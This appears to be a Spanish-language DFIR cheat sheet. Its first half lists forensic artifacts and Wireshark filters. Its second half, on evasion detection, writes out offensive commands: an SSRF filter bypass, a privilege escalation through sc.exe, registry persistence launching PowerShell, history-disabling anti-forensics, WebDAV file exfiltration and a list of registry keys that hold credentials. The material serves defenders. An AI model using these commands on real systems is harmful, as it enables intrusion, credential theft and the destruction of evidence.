<h1 align="center">
  <img src="dfir-logo.png" alt="DFIR & Detection Engineering" width="450">
  <br>
  Digital Forensics Incident Response & Detection Engineering
</h1>

Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense y detección de técnicas utilizadas por actores maliciosos para la evasión de sistemas de protección y monitorización.

- 🔍 [Análisis forense y artefactos](#-análisis-forense-y-artefactos)
- 📓 [Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense](#-detección-de-técnicas-de-evasión-en-sistemas-siem-soc-y-anti-forense)

---

# 🔍 Análisis forense y artefactos

### 🔵 Logs de eventos de Windows

| Path | Info | Evidencias |
|------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |

### 🔵 Logs de registros varios sobre instalaciones en Windows

| Path | Info | Evidencias |
|------|------|------------|
| `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
| `%WINDIR%\setupact.log` | Contiene información acerca de las acciones de instalación durante la misma | Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación |
| `%WINDIR%\setuperr.log` | Contiene información acerca de los errores de instalación durante la misma | Fallos de programas, rutas de red inaccesibles, rutas a volcados de memoria |
| `%WINDIR%\WindowsUpdate.log` | Registra toda la información de transacción sobre la actualización del sistema y aplicaciones | Tipos de hotfix instalados, fechas de instalación, elementos por actualizar |
| `%WINDIR%\Debug\mrt.log` | Resultados del programa de eliminación de software malintencionado de Windows | Fechas, Versión del motor, firmas y resumen de actividad |
| `%WINDIR%\security\logs\scecomp.old` | Componentes de Windows que no han podido ser instalados | DLL's no registradas, fechas, intentos de escritura,rutas de acceso |
| `%WINDIR%\SoftwareDistribution\ReportingEvents.log` | Contiene eventos relacionados con la actualización | Agentes de instalación, descargas incompletas o finalizadas, fechas, tipos de paquetes, rutas |
| `%WINDIR%\Logs\CBS\CBS.log` | Ficheros pertenecientes a ‘Windows Resource Protection’ y que no se han podido restaurar | Proveedor de almacenamiento, PID de procesos, fechas, rutas |
| `%AppData%\Local\Microsoft\Websetup` (Windows 8) | Contiene detalles de la fase de instalación web de Windows 8 | URLs de acceso, fases de instalación, fechas de creación, paquetes de programas |
| `%AppData%\setupapi.log` | Contiene información de unidades, services pack y hotfixes | Unidades locales y extraibles, programas de instalación, programas instalados, actualizaciones de seguridad, reconocimiento de dispositivos conectados |
| `%WINDIR%\INF\setupapi.dev.log` | Contiene información de unidades Plug and Play y la instalación de drivers | Versión de SO, Kernel, Service Pack, arquitectura, modo de inicio, fechas, rutas, lista de drivers, dispositivos conectados, dispositivos iniciados o parados |
| `%WINDIR%\INF\setupapi.app.log` | Contiene información del registro de instalación de las aplicaciones | Fechas, rutas, sistema operativo, versiones, ficheros, firma digital, dispositivos |
| `%WINDIR%\Performance\Winsat\winsat.log` | Contiene trazas de utilización de la aplicación WINSAT que miden el rendimiento del sistema | Fechas, valores sobre la tarjeta gráfica, CPU, velocidades, puertos USB |
| `%ProgramData%\Microsoft\Windows Defender\Support` | Contiene pruebas históricas de WD (Windows Defender). Los nombres de los archivos serán- MPLog-\*.log, MPDetection-\*.log, MPDeviceControl-\*.log | Fechas, versiones productos, servicios, notificaciones, CPU, ProcessImageName, EstimatedImpact, binarios, etc. |
| `%ProgramData%\Microsoft\Windows Defender\Scans\Scans\History` | Cuando se detecta una amenaza, WD almacena un archivo binario "DetectionHistory" | Se pueden analizar estos archivos utilizando herramientas como DHParser |

### 🔵 Artefactos de conexiones de clientes VPN

Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```

### 🔵 Persistencia en servicios

Rama del registro donde se almacenan los valores de imagen de un controlador en un servicio. Usado a veces para mantener persistencia en el sistema.

Analizar ruta y parámetros del valor *"ImagePath"*.
```
HKLM\SYSTEM\CurrentControlSet\Services
```

### 🔵 ¿Han eliminado el registro de eventos de Windows?

¿Los atacantes eliminaron todos los registros de eventos de Windows?

VSS (Volume Shadow Copy) podría ser una opción pero hay escenarios donde esto también fue eliminado de forma intencionada.

1. Volcado de memoria: https://www.volatilityfoundation.org/releases
2. Montar con MemProcFS: https://github.com/ufrisk/MemProcFS
3. Copiar los archivos evtx:

```ps
Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\evtx_files
```

- Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs

### 🔵 Volatility: clipboard

Desde un volcado de memoria, los datos del portapapeles pueden se interesantes para revelar información.
```
volatility.exe -f memdump.bin --profile=Win10x64_10586 clipboard
```
- Referencia: https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf

### 🔵 Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)

Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.

Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a casos de notty SSH) 

```bash
grep -l SSH_C /proc/*/environ
```

### 🔵 Filtros Wireshark para analistas

- Referencia: https://www.wireshark.org/docs/dfref
- Brim Zed (herramienta que simplifica el análisis de datos superestructurados .pcapng): https://www.brimdata.io/download

- Filtrar por dirección IP. Donde "x.x.x.x" es la dirección IP que desea filtrar.
```
ip.addr == x.x.x.x
```

- Filtrar por rango de direcciones IP. Donde "x.x.x.x" e "y.y.y.y" son las direcciones IP inicial y final del rango.
```
ip.addr >= x.x.x.x and ip.addr <= y.y.y.y
```

- Filtrar por interfaz de red. Mostrar sólo los paquetes capturados en la interfaz eth0.
```
interface == eth0
```

- Filtrar por puerto. Donde "80" y "53" son los números de puerto que desees filtrar.
```
tcp.port == 80
udp.port == 53
```

- Filtrar por longitud del paquete. Mostrar sólo los paquetes de más de 100 bytes.
```
frame.len > 100
```

- Filtrar por dirección MAC de origen o destino. Donde "xx:xx:xx:xx:xx:xx" es la dirección MAC origen y destino que desees filtrar.
```
eth.src == xx:xx:xx:xx:xx:xx
eth.dst == xx:xx:xx:xx:xx:xx
```

- Filtrar por método HTTP. Mostrar sólo los paquetes con método GET. Puede sustituir GET por otros métodos HTTP como POST, PUT, DELETE, etc.
```
http.request.method == GET
http.request.method == POST && frame contains "login"
```

- Filtrar por códigos de estado HTTP.
```
# Respuestas Ok.
http.response.code == 200

# Respuestas de redireccionamiento. 301 redirección permanente y 302 redirección temporal.
http.response.code == 301 or http.response.code == 302

# Respuestas de error "Not Found". 
http.response.code == 404
```

- Filtrar por URI HTTP. Mostrar sólo los paquetes que tienen un URI que contiene "domain.com". Puede sustituir "domain.com" por cualquier otra cadena URI.
```
http.request.uri contains 'domain.com'
```

- Filtrar por cookie HTTP. Mostrar sólo los paquetes que contienen una cookie con el nombre "sessionid".
```
http.cookie contains 'sessionid'
```

- Filtrar por tamaño de paquete. Mostrar sólo los paquetes de más de 1000 bytes.
```
frame.len > 1000
```

- Filtros DNS.
```
# Paquetes DNS que tengan un nombre de dominio que contenga "domain.com"
dns.qry.name contains 'domain.com'
dns.resp.name == domain.com 

# Consulta/respuesta de puntero DNS (PTR, DNS Inverso)
dns.qry.type == 12

# Consultas MX
dns.qry.type == 15

# Solo consultas DNS.
dns.flags.response == 0

# Solo consultas de respuesta DNS.
dns.flags.response eq 1 # only DNS response queries

# Errores DNS.
dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)

# NXDominio no existente.
dns.flags.rcode == 3

# No Error, nslookup microsoft.com 193.247.121.196.
((dns.flags.rcode == 3) && !(dns.qry.name contains ".local") && !(dns.qry.name contains ".svc") && !(dns.qry.name contains ".cluster"))
(dns.flags.rcode == 0) && (dns.qry.name == "microsoft.com")

dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)
```

- Filtros TLS.
```
# TLS handshake.
tls.record.content_type == 22

# Filtrar por tipo de handshake SSL/TLS.
ssl.handshake.type = TLS
ssl.handshake.type = SSL

# Paquetes "TLS Client Hello".
tls.handshake.type == 1

# Paquetes "TLS Server Hello".
tls.handshake.type == 2

# Conexión cerrada.
tls.record.content_type == 21

# Paquetes relacionados con la comunicación entre el cliente y el servidor que involucren el sitio web "badsite.com".
tls.handshake.extensions_server_name contains "badsite.com"

# Cuando se produce el timeout, el cliente suele enviar un RST al servidor para filtrar los paquetes con el timeout del handshake. 
(tcp.flags.reset eq 1) and (tcp.flags.ack eq 0)

# Paquetes que tardan en responder a SYNACK durante el handshake del servidor.
tcp.flags eq 0x012 && tcp.time_delta gt 0.0001
```

- Filtros GeoIP
```
# Excluir el tráfico procedente de Estados Unidos.
ip and not ip.geoip.country == "United States" 

# Ciudad de destino [IPv4].
ip.geoip.dst_city == "Dublin" 

# Ciudad de origen o destino [IPv4].
ip.geoip.city == "Dublin"
ip.geoip.dst_country == "Ireland"
ip.geoip.dst_country_iso == "IE"

# Todos los países de destino excepto Estados Unidos.
!ip.geoip.country == "United States" 
not ip.geoip.country == "United States"
```

- Establecer un filtro para los valores HEX de 0x22 0x34 0x46 en cualquier offset.
```
udp contains 22:34:46
```

- Filtrar por flags TCP. Mostrar sólo los paquetes con la bandera SYN activada. Puede sustituir SYN por cualquier otro indicador TCP, como ACK, RST, FIN, URG o PSH.
```
tcp.flags.syn == 1
```

- Mostrar todos los flags SYNACK TCP.
```
tcp.flags.syn == 1 && tcp.flags.ack == 1
```

- Mostrar paquetes con reconocimientos duplicados en TCP.
```
tcp.analysis.duplicate_ack
```

### 🔵 Análisis Forense en contenedores Docker 

Si un contenedor malicioso modifica archivos o acciones de malware al iniciarse, es posible que se pierdan muchos artefactos de seguridad. La solución podría ser trabajar con el contenedor que se crea pero que no se inicia.

Extraer el sistema de archivos de contenedores de Docker. 

- Referencia: https://iximiuz.com/en/posts/docker-image-to-filesystem

Ejemplo con una imagen oficial de nginx.

Opción 1: **`docker export`**
```bash
docker pull nginx
CONT_ID=$(docker run -d nginx)
docker export ${CONT_ID} -o nginx.tar.gz

mkdir rootfs
tar -xf nginx.tar.gz -C rootfs
ls -lathF rootfs
```

Opción 2: **`docker build`**
```bash
echo 'FROM nginx' > Dockerfile
DOCKER_BUILDKIT=1 docker build -o rootfs .
ls -lathF rootfs
```

Opción 3: **`crt (containerd CLI)`**

Montar imágenes de contenedores como carpetas locales del host.
```bash
ctr image pull docker.io/library/nginx:latest
mkdir rootfs
ctr image mount docker.io/library/nginx:latest rootfs
ls -lathF rootfs
```

### 🔵 Análisis y artefactos de ShellBags

Shellbags son un conjunto de claves de registro que contienen detalles sobre la carpeta vista de un usuario, como su tamaño, posición e icono. Proporcionan marcas de tiempo, información contextual y muestran el acceso a directorios y otros recursos, lo que podría apuntar a evidencia que alguna vez existió. 

Se crea una entrada de shellbag para cada carpeta recién explorada, indicaciones de actividad, actuando como un historial de qué elementos del directorio pueden haberse eliminado de un sistema desde entonces, o incluso evidenciar el acceso de dispositivos extraíbles donde están ya no adjunto.

El análisis de Shellbag puede exponer información sobre:

- Accesos a carpetas.

Por ejemplo, elementos de escritorio, categorías/elementos del panel de control, letra de unidad, directorios o incluso archivos comprimidos.

- Evidencia de eliminación, sobrescritura o cambio de nombre de carpeta.
- Patrones transversales y de navegación de directorios.

Esto también podría incluir evidencia de acceso remoto (RDP o VNC), así como la eliminación de archivos binarios o el acceso a recursos de red.

**Artefactos de las Shellbags**

`NTUSER.DAT`
```
HKCU\Software\Microsoft\Windows\Shell\Bags
HKCU\Software\Microsoft\Windows\Shell\BagMRU
```

`USRCLASS.DAT`
```
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags
```

Descripción de valores relevantes:

| Valor | Descripción |
|-------|-------------|
| `MRUListExt` | Valor de 4 bytes que indica el orden en el que se accedió por última vez a cada carpeta secundaria de la jerarquía BagMRU |
| `NodeSlot` | Contiene las preferencias de visualización y la configuración de shellbag |
| `NodeSlots` | Solo está en la clave raíz de BagMRU y se actualiza cada vez que se crea una nueva shellbag |

**Referencia detallada para la interpretación de ShellBags**

- https://www.4n6k.com/2013/12/shellbags-forensics-addressing.html

**Herramienta para explorar y análizar Shellbags tanto de forma online como offline**

-  **ShellBags Explorer** (GUI) o **SBECmd** (CLI): https://ericzimmerman.github.io/#!index.md

### 🔵 Thumbcache Viewer

Visualizar ficheros *"thumbcache_\*.db"*.

- https://thumbcacheviewer.github.io

### 🔵 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp

Un usuario envió imágenes a través de Whatsapp, después las eliminó de su dispositivo móvil, pero estas imágenes todavía están en la carpeta "sent" de WhatsApp.

```
"Internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
```

### 🔵 Comprobar si un usuario ejecutó el comando "sudo"

En un escenario en el que un posible atacante creó un nuevo usuario y eliminó el historial de comandos, pero aún no se puede confirmar si el atacante obtuvo privilegios de root ejecutando el comando "sudo".

Verificar si el archivo **".sudo_as_admin_successful"** está en el directorio de inicio del usuario. Si se encuentra, entonces el atacante ejecutó el comando "sudo".

### 🔵 Artefactos en dispositivos USB (Windows, Linux y MacOS)

`Windows`

Ramas del registro USB a analizar:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices\Devices
HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\SWD\WPDBUSENUM
HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\EMDMgmt
```

Otros artefactos USB a analizar:
```
C:\Windows\System32\winevt\Logs\Microsoft-Windows-DriverFrameworks-UserMode%4Operational.evtx (Windows 7)
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Storage-ClassPnP/Operational.evtx 
C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-MTPClassDriver/Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Partition%4Diagnostic.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx
C:\Windows\INF\setupapi.dev.log
C:\Windows\INF\setupapi.dev.yyyymmdd_hhmmss.log
C:\Windows\setupapi.log
C:\Users\<user account>\AppData\Roaming\Microsoft\Windows\Recent\<Lnk files>

Carpeta "Windows.old"
Volume Shadow Copies
```

**Event ID 6416**: El Sistema reconoció un nuevo dispositivo externo. 
- https://learn.microsoft.com/es-es/windows/security/threat-protection/auditing/event-6416

**Logman**: Capturar el seguimiento de eventos de USBs. 
- https://learn.microsoft.com/es-es/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace

`Linux`

- Distribuciones basadas en Debian
```
/var/log/syslog
```

- Distribuciones basadas en Red Hat

Habilitar un registro detallado USB configurando "EnableLogging=1" en el fichero "/etc/usb_modeswitch.conf".
```
/var/log/messages

/var/log/usb_modeswitch_<interface name>
```

`Mac OSX`
```
/private/var/log/kernel.log
/private/var/log/kernel.log.incrementalnumber.bz2
/private/var/log/system.log
/private/var/log/system.log.incrementalnumber.gz
```

`Herramientas de terceros`
- USBDeview: https://www.nirsoft.net/utils/usb_devices_view.html
- USB Forensic Tracker (USBFT) Windows, Linux y MacOS: https://www.orionforensics.com/forensics-tools/usb-forensic-tracker

### 🔵 Análisis Forense de logs en AnyDesk, Team Viewer y LogMeIn 

`AnyDesk`

Artefactos AnyDesk. 

El registro "ad.trace" revela información como:
- IP remota desde donde se conectó el actor
- Actividad de transferencia de archivos

```
%ProgramData%\AnyDesk\ad_svc.trace
%AppData%\Anydesk\ad.trace
```

En el log "ad.trace" de la carpeta del usuario *AppData* buscamos por los criterios "files" y "app.prepare_task". Esto revelará desde qué carpeta se están copiando los archivos y también la cantidad de archivos copiados.

En el mismo fichero buscamos por el término "External address" y esto revelará la dirección IP remota donde se conectó el actor malicioso.

`Team Viewer`

Team Viewer - Referencia logs: 
- https://community.teamviewer.com/Spanish/kb/articles/4694-como-localizar-los-archivos-de-registro

Team Viewer - Arquitectura de seguridad en comunicaciones: 
- https://static.teamviewer.com/resources/2020/11/security-encryprion-1.jpg

`LogMeIn`

Artefactos LogMeIn.
```
C:\Program Data\LogMeIn
C:\Users\<username>\AppData\Local\LogMeIn
```
```
SOFTWARE\LogMeIn\Toolkit\DesktopSharing
SOFTWARE\LogMeIn\V5 LogMeIn\Toolkit\Filesharing
SOFTWARE\LogMeIn\V5
SOFTWARE\LogMeIn Ignition
```

### 🔵 Conocer la URL de descarga de un archivo (Zone.Identifier)

Saber si un archivo malicioso se descargó de Internet y desde que URL o se creó en el sistema local.

PowerShell
```
Get-Content -Path .\<FileName> -Stream Zone.Identifier -Encoding oem
```

CMD
```
notepad <FileName>:Zone.Identifier
```

### 🔵 Artefactos forense - MS Word

`Eventos de alertas MS Office`

```
Event Viewer > Applications and Services Logs > Microsoft Office Alerts
```

`Conocer las URLs visitadas desde Word`

¿Cómo saber si la víctima hizo clic en una URL maliciosa de un documento de MS Word? 

El valor de **"UseRWHlinkNavigation"** contiene la última URL a la que se accedió desde MS Word.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet
```

La siguiente rama contiene subclaves con los destinos remotos que MS Word estaba tratando de alcanzar.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet\Server Cache
```

`Ficheros abiertos recientemente en Word`

Revisar el siguiente directorio y el contenido del fichero **"inditex.dat"**.
```
%AppData%\Microsoft\Office\Recent
```

`Ficheros de inicio en Word`

Cuando un usuario inicia MS Word los archivos de esta ubicación se cargan automáticamente. Estos archivos estarán en formato .dot, .dotx o .dotm.
```
%AppData%\Microsoft\Word\STARTUP
```

`Buscar archivos recientes con macros habilitadas`

Contiene una lista de nombres de archivo. Los valores con "FF FF FF 7F" al final, indican que tienen la macro habilitada.
```
HKCU\SOFTWARE\Microsoft\Office\<version>\Word\Security\TrustedDocuments\TrustRecords
```

`Macros de seguridad en Word`

**"VBAWarnings"** indica el estado de las macros de seguridad.

- Valor 1: todas las macros están habilitadas
- Valor 2: todas las macros están desactivadas con notificación 
- Valor 3: todas las macros están desactivadas excepto las firmadas digitalmente.
- Valor 4: todas las macros están desactivadas sin notificación.

```
HKCU\Software\Policies\Microsoft\Office\<version>\Word\Security\VBAWarnings
```

`Caché de Word`

Esta ubicación se utiliza para almacenar los archivos *scratch* de MS Word. Si un usuario abre un archivo .docx con macro, Word puede crear un archivo *"WRCxxxx.tmp"*. Este archivo puede contener varios artefactos.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Word
```

`Archivos adjuntos Word abiertos desde Outlook`

Los archivos adjuntos tipo Word abiertos en directamente a través de en Outlook (en preview) se almacenan en esta ubicación.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Outlook\<Folder>\
```

### 🔵 Analizar malware en fichero XLSX (MS Excel)

Descomprimir el fichero .xlsx, dentro de la carpeta "XL" abrir editando el archivo llamado "workbook.xml", buscar el término **"absPath"**. Contiene la última ubicación de guardado del archivo donde veríamos al autor (C:\\<\user>\\..\\file.xlsx).

Como técnica anti forense esta metadata se puede eliminar desde Excel "inspeccionando el documento" y borrando las "propiedades de documento e información personal". 

### 🔵 Asignación de IPs en equipos

En un incidente se descubre que se envió un paquete de red mal formado desde una dirección IP, pero el atacante elimina dicho registro. Se puede consultar la siguiente rama del registro para encontrar el equipo en la red que tenía esa dirección IP. Cada subclave tendrá un registro DHCP con los valores DhcpIPAddress, DhcpNameServer, etc.
```
HKLM\SYSTEM\ControlSet00*\Services\Tcpip\Parameters\Interfaces
```

### 🔵 Windows Firewall (wf.msc): Reglas residuales de software desintalado

Comprobar las reglas de entrada y salida en Windows Firewall **"wf.msc"**. Un actor malicioso podría haber instalado software que creó reglas de firewall. La mayoría de las aplicaciones no borran estas reglas, incluso cuando se desinstala.

### 🔵 Persistencia: suplantación de procesos del sistema

Detección de 2 procesos con el mismo PID pero diferentes direcciones de memoria, podría indicar un proceso de inyección malicioso. 

Algunos ejemplos en procesos conocidos.
```
Process: explorer.exe | Pid: 547  | Address: 0xa20000
Process: explorer.exe | Pid: 547  | Address: 0x5d1000

Process: svchost.exe  | Pid: 1447 | Address: 0x6d0000
Process: svchost.exe  | Pid: 1447 | Address: 0x210000

Process: rundll32.exe | Pid: 5287 | Address: 0xa90000
Process: rundll32.exe | Pid: 5287 | Address: 0x6a1000
```

### 🔵 SANS - Posters & Cheat Sheets (DFIR)

- Referencia: https://www.sans.org/posters/?focus-area=digital-forensics


---


# 📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense

### 🔵 Comando Windows: net y net1

El comando "net1" funcionará igual que el comando "net".
```cmd
net1 accounts
net accounts
```

### 🔵 *debugfs* para ejecutar comandos
```bash
df -h
sudo debugfs /dev/sda1
debugfs: ls
debugfs: cat /etc/passwd
... modo interactivo ...
```

### 🔵 WAF Bypass (SSRF): usar acortamiento IP local

| Bloqueo            | Bypass           |
|--------------------|------------------|
| http://10.0.0.1    | http://1.1       |
| http://127.0.0.1   | http://127.1     |
| http://192.168.0.5 | http://192.168.5 |

### 🔵 Post-Explotación - PrivEsc con scmanager
LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).

- https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager

```cmd
sc.exe sdset scmanager D:(A;;KA;;;WD)
[SC] SetServiceObjectSecurity SUCCESS
```

### 🔵 Comando history

Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.

```bash
$ sudo bash malware.sh
$ history
    1  clear
    2  sudo bash malware.sh
    3  history
```

Presionar tecla hacia arriba (↑), modificar la cadena de texto, sin pulsar Enter volver cambiar a otro comando pasado pulsando nuevamente la tecla hacia arriba (↑), eliminar y volver ejecutar history para comprobar que el comando inicial no a sido almacenado sino sustituido sin ejecución.
```bash
$ sudo bash software.sh
$ history
    1  clear
    2* bash software.sh
    3  history
```

### 🔵 Deshabilitar el uso del historial en la Shell

Un actor malicioso puede ejecutar estos comandos para no guardar o registrar en el archivo .bash_history el historial de acciones en la shell como técnica anti forense y evitar ser detectados.
```bash
export HISTFILE=/dev/null
export HISTFILESIZE=0
```

### 🔵 DLL Hijacking *cscapi.dll*
Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.

- https://twitter.com/D1rkMtr/status/1613568545757220864

```cmd
C:\Windows\cscapi.dll
```

### 🔵 Otra técnica de ejecución de CMD o PowerShell

Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Utilities\query" /v pwned /t REG_MULTI_SZ /d 0\01\0pwned\0powershell.exe
```

Al consultar la rama del registro se ejecutará una Powershell.exe.
```cmd
query pwned
```

La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).

### 🔵 Uso de *type* para descargar o subir ficheros

1. Alojar un servidor WebDAV con acceso anónimo r/w
2. Download: 
```cmd
type \\webdav-ip\path\file.ext > C:\path\file.ext
```
3. Upload: 
```cmd
type C:\path\file.ext > \\webdav-ip\path\file.ext
```

### 🔵 Forensia (Anti-Forensic)

Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.

- https://github.com/PaulNorman01/Forensia

### 🔵 Bloquear conexiones USB: Rubber Ducky y Cactus WHID

- HID - Hardware ID 
- VID - Vendor ID
- PID - Product ID

**Rubber Ducky**.
```
HID\VID_03EB&PID_2401&REV_0100
```

**Cactus WHID** (whid-injector).
```
HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02
HID\VID_1B4F&PID_9208&MI_02&Col02
```

```ps
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDs' -Value 1 -PropertyType DWord
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDsRetroactive' -Value 1 -PropertyType DWord

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_03EB&PID_2401&REV_0100' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&MI_02&Col02' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
```

### 🔵 Claves de registro de Windows donde se almacenan las contraseñas

Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 

Las claves se ordenan de mayor a menor ocurrencia.
```
KLM\Software\RealVNC\WinVNC4
HKCU\Software\SimonTatham\PuTTY\Sessions
HKCU\Software\ORL\WinVNC3\Password
HKLM\SYSTEM\Current\ControlSet\Services\SNMP
HKCU\Software\Polices\Microsoft\Windows\Installer
HKLM\SYSTEM\CurrentControlSet\Services\SNMP
HKCU\Software\TightVNC\Server
HKCU\Software\OpenSSH\Agent\Keys
HKLM\SYSTEM\CurrentControlSet\Control\LSA
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
HKLM\Software\RealVNC\vncserver
HKLM\Software\RealVNC\WinVNC4\Password
HKLM\Software\RealVNC
HKCU\Software\PremiumSoft\Navicat\Servers
HKLM\SYSTEM
HKLM\SAM
HKCU\Software\PremiumSoft\NavicatMONGODB\Servers
HKCU\Software\PremiumSoft\NavicatMSSQL\Servers
HKCU\Software\PremiumSoft\NavicatPG\Servers
HKCU\Software\PremiumSoft\NavicatSQLite\Servers
HKCU\Software\PremiumSoft\NavicatMARIADB\Servers
HKCU\Software\PremiumSoft\NavicatOra\Servers
HKCU\Software\TigerVNC\WinVNC4
```

### 🔵 WDigest Authentication: Habilitado / Deshabilitado

Si un malware habilita la "Autenticación WDigest" las contraseñas se almacenarán en texto claro en LSASS y en la memoria. En Windows 10 está deshabilitado de forma predeterminada.
```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

Habilitado:    UseLogonCredential = 1
Deshabilitado: UseLogonCredential = 0
```

### 🔵 Detectar si un sistema es una máquina virtual con PowerShell o WMIC

PowerShell
```ps
Get-MpComputerStatus | Select-Object "IsVirtualMachine" | fl
```

CMD
```cmd
WMIC BIOS > wmic_bios.txt

...
BIOSVersion     SMBIOSBIOSVersion
{"VBOX  -1"}    VirtualBox
...
```

### 🔵 Técnicas de ofuscación en la ejecucación de comandos en Windows

- https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation


### 🔵 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)

Un atacante creó un valor *"AutoRun"* en la siguiente clave de registro, aquí pudo agregar un comando malicioso como sus datos de valor. Ahora, cada vez que se inicie una consola cmd este comando se ejecutará automáticamente.
```
HKLM\SOFTWARE\Microsoft\Command Processor
```

### 🔵 Extensiones ejecutables alternativas a .exe

Un atancante puede renombrar la extensión de un fichero malicioso a extensiones como: 

- **.pif**, **.scr** o **.com**

Todas se ejecutarán de la misma forma que .exe.

### 🔵 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (tipo de flujo NTFS en directorios $INDEX_ALLOCATION)

Un posible actor malicioso podría crear una carpeta visible a través de línea de comandos ejecutando un dir y/o también verla en un explorador de Windows. 

En ambas situaciones no es posible acceder a este directorio debibo a que el nombre no a sido creado como lo vemos en pantalla o en el output de consola, sino que es posible que haya sido creado con un punto al final del nombre, estableciendo un tipo de flujo *$INDEX_ALLOCATION* y un nombre de flujo *$I30* o vacío, ambos son equivalentes. 

```
md <nombre_carpeta>.::$index_allocation
md <nombre_carpeta>.:$I30:$index_allocation
```

De esta forma aparecerá el nombre del cirectorio seguido de un punto, pero cuando se intente acceder a el ya sea de forma gráfica con doble clic o vía consola con "cd" se mostrará un mensaje de error indicando que la "ubicación no está disponible o no es correcta para ese equipo". Una manera de solucionar esto sería acceder vía "cd" en consola e indicando: "*nombre carpeta.+flujo vacío+tipo de flujo*". (Esto no está soportado en Powershell)

```
cd <nombre_carpeta>.::$index_allocation
cd <nombre_carpeta>.:$I30:$index_allocation
```

